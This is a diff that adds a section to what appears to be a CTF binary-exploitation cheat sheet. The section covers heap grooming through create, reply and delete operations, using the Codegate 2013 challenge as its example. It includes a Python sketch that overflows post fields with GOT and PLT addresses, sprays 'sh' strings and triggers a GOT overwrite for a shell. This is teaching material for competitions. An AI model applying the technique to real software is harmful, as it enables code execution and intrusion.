@@ -11,6 +11,7 @@
 - [House of Einherjar — Off-by-One Null Byte (0xFun 2026)](#house-of-einherjar--off-by-one-null-byte-0xfun-2026)
 - [Use-After-Free (UAF) Exploitation](#use-after-free-uaf-exploitation)
 - [Heap Exploitation](#heap-exploitation)
+  - [Heap Grooming via Application Operations (Codegate 2013)](#heap-grooming-via-application-operations-codegate-2013)
 - [Custom Allocator Exploitation](#custom-allocator-exploitation)
 - [JIT Compilation Exploits](#jit-compilation-exploits)
 - [Esoteric Language GOT Overwrite](#esoteric-language-got-overwrite)
@@ -233,6 +234,45 @@ analyze_report(0)             # Calls dangling pointer -> win()
 - Create holes of specific sizes by allocating then freeing
 - Place target structures adjacent to overflow source
 - Use spray patterns with incremental offsets (e.g., 0x200 steps)
+
+### Heap Grooming via Application Operations (Codegate 2013)
+
+**Pattern:** Multi-step application-level operations (create/reply/delete in a board, forum, or note app) to achieve controlled heap state for exploitation.
+
+**Technique:**
+1. Create N entries with overflow payloads in author/title/content fields
+2. Fill reply buffers for each entry (e.g., 127 replies of `"sh"`) to place controlled data at predictable heap locations
+3. Selectively delete entries to create specific heap holes
+4. Allocate new entries that land in freed chunks, overlapping with surviving metadata
+
+```python
+# Example: Codegate 2013 Vuln 400 — board-based heap grooming
+# Step 1: Create 7 posts with overflow in content field
+for i in range(7):
+    create_post("YOLO", "YOLO",
+        "A" * 36 + pack("I", got_addr) +    # Author overflow
+        "A" * 604 + pack("I", got_addr) +    # Content overflow
+        pack("I", plt_addr) * 80)            # Spray GOT targets
+
+# Step 2: Fill reply buffers to heap-spray "sh" strings
+for i in range(7):
+    for j in range(127):
+        reply_to_post(i, "sh")
+
+# Step 3: Delete 5 of 7 to create specific heap holes
+for i in [0, 1, 2, 3, 4]:
+    delete_post(i)
+
+# Step 4: Allocate 2 new entries into freed space
+create_post(payload_a, payload_b, payload_c)
+create_post(payload_d, payload_e, payload_f)
+
+# Step 5: Trigger via modify + delete sequence
+modify_post(target_id, trigger_payload)
+delete_post(target_id)  # Triggers GOT overwrite → shell
+```
+
+**Key insight:** Application operations (create, reply, delete, modify) map to heap allocations and frees of predictable sizes. By controlling the sequence and count of operations, you achieve the same effect as direct heap manipulation but through the application's own interface.
 
 ## Custom Allocator Exploitation
 
